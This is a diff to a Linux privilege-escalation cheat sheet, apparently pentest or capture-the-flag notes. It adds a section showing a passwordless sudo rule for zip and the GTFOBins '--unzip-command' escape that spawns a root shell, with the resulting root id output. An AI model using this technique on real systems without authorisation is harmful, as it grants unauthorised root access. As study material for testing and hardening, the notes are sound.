@@ -207,7 +207,15 @@ ls -la /
 sudo -l
 ````
 Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
-- SUID
+#### Zip
+````
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+touch hello.txt
+sudo /usr/bin/zip 1.zip hello.txt -T --unzip-command="sh -c /bin/bash"
+id
+uid=0(root) gid=0(root) groups=0(root)
+````
 ````
 Sudo -l
 ````
